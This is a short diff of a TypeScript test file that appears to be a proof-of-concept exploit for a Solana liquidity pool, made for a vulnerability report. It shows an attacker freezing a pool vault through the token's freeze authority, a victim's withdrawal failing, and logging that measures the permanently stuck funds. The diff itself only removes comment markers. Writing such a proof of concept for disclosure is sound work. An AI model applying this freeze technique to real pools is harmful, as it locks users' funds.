@@ -287,7 +287,7 @@ describe("freeze authority poc", () => {
     await client.processTransaction(openPositionTx);
     console.log("STEP 5c PASS: victim opened a real position and deposited real liquidity into the vaults");
 
-    // === [ADDED] BALANCE CHECK: prove real funds are sitting in the vaults ===
+
     console.log("\n[BALANCE CHECK] Vaults after deposit:");
     const vault0Before = await printVaultBalance(client, tokenVault0, "Vault0");
     const vault1Before = await printVaultBalance(client, tokenVault1, "Vault1");
@@ -325,7 +325,7 @@ describe("freeze authority poc", () => {
 
     console.log("STEP 6 PASS: attacker froze the pool vault:", freezeTargetVault.toBase58());
 
-    // === [ADDED] BALANCE CHECK: confirm the vault is now frozen (state 2) ===
+    
     console.log("\n[BALANCE CHECK] Vault state after freeze (2 = Frozen):");
     await printVaultBalance(client, freezeTargetVault, "Frozen vault");
 
@@ -372,13 +372,12 @@ describe("freeze authority poc", () => {
       console.log("STEP 7 CONFIRMED: withdrawal FAILED as expected. Vault is frozen, funds are stuck.");
       console.log("Failure reason:", failureReason);
 
-      // === [ADDED] IMPACT: quantify the funds that are now stuck ===
       const frozenAmount = freezeTargetVault.equals(tokenVault0) ? vault0Before : vault1Before;
       console.log(`\n[IMPACT] Funds permanently frozen: ${frozenAmount.toString()} raw units (${Number(frozenAmount) / 1e9} tokens, 9 decimals)`);
       console.log("[IMPACT] Note: these are synthetic test tokens. For the report, translate this raw-unit amount");
       console.log("[IMPACT] into the real token's decimals and USD price for the actual affected mainnet pool.");
 
-      // === [ADDED] PERMANENCE CHECK: prove there is no recovery path ===
+
       console.log("\n[PERMANENCE CHECK] Attempting close_position on frozen vault...");
       try {
         const closePositionIx = await program.methods
